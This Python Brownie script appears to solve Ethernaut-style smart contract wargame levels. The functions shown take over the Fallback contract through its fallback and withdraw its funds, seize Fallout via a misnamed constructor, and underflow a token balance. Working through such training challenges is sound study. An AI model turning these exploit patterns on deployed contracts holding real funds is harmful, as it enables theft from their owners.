from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy, Recovery
from brownie.network.gas.strategies import GasNowStrategy
from brownie.network import gas_price
from scripts.interface import *
import time
from web3.auto.infura import w3
from web3 import Web3, EthereumTesterProvider
import os
from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
from brownie import NaughtCoin, Preservation, AttackPreservation, SimpleToken, MagicNum


def attack_fallback(contract, _account):
    contributions = contract.getContribution({"from": _account})
    print(f"Before the attack...Current contributions: {contributions} Are we the owner?: {contract.owner() == _account}")

    # adding .wait(1) shouldn't be necessary, but we're explicitly waiting for the block to be mined
    contract.contribute({"value": 500000000000000, "from": _account}).wait(1)
    contributions = contract.getContribution({"from": _account})
    print(f"Contributions now: {contributions}")
    _account.transfer(contract.address, "0.01 ether").wait(1)
    owner = contract.owner()
    is_owner = (owner == _account)
    print(f"Sent .01 ETH. Are we the owner?: {is_owner}")
    contract.withdraw({"from": _account})
    print("Fallback attacked! Try submitting the solution as complete.")


def attack_fallout(contract, _account):
    print(f"Before the attack...are we the owner? {_account == contract.owner()}")
    contract.Fal1out({"from": _account, "value": 0})
    print(f"After the attack...are we the owner? {_account == contract.owner()}")
    print("Fallout attacked! Try submitting the solution as complete.")


def attack_token(_token, _account, target_account):
    print(f"Before the attack...our balance is {_token.balanceOf(_account.address)}")
    print(f"Target account balance is: {target_account}")
    _token.transfer(target_account, 21, {"from": _account})
    print(f"After the attack...our balance is {_token.balanceOf(_account.address)}")
